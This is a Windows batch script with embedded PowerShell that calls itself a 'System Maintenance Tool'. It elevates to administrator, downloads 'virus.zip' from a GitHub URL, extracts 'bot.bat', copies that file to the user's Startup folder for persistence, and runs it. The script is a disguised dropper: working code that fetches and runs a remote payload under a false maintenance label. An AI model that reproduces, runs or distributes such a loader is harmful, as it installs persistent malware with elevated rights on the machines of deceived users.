@echo off
title System Maintenance Tool
color 0A

:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Access Denied. Please run as Administrator.
    echo Attempting to restart with admin rights...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Admin confirmed
echo Admin privileges confirmed. Proceeding with update...

:: Run entire process in PowerShell to avoid batch path issues
powershell -Command "
    $temp = [System.Environment]::GetEnvironmentVariable('TEMP')
    $zipPath = Join-Path $temp 'virus.zip'
    $extractPath = Join-Path $temp 'virus_extracted'
    
    # Clean up old files
    if (Test-Path $extractPath) { Remove-Item -Path $extractPath -Recurse -Force }
    if (Test-Path $zipPath) { Remove-Item -Path $zipPath -Force }
    
    # Download
    Write-Host 'Downloading virus.zip...'
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/banzoxOG/test/main/virus.zip' -OutFile $zipPath
    
    # Verify download
    if (-not (Test-Path $zipPath)) {
        Write-Host 'Download failed.'
        exit 1
    }
    
    # Create extraction directory
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
    
    # Extract using System.IO.Compression.ZipFile
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath, $true)
    
    # Find bot.bat
    $botFile = Get-ChildItem -Path $extractPath -Recurse -Filter 'bot.bat' -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if ($botFile) {
        Write-Host 'Found bot.bat at: ' $botFile.FullName
        # Copy to startup
        $startup = [Environment]::GetFolderPath('Startup')
        $destPath = Join-Path $startup 'bot.bat'
        Copy-Item -Path $botFile.FullName -Destination $destPath -Force
        Write-Host 'bot.bat copied to startup.'
        # Run it
        Start-Process -FilePath $botFile.FullName
        Write-Host 'bot.bat executed.'
    } else {
        Write-Host 'bot.bat not found in extracted files.'
    }
"

:: Check if PowerShell succeeded
if %errorlevel% equ 0 (
    echo All operations completed successfully.
) else (
    echo An error occurred during the process.
)

pause
exit /b
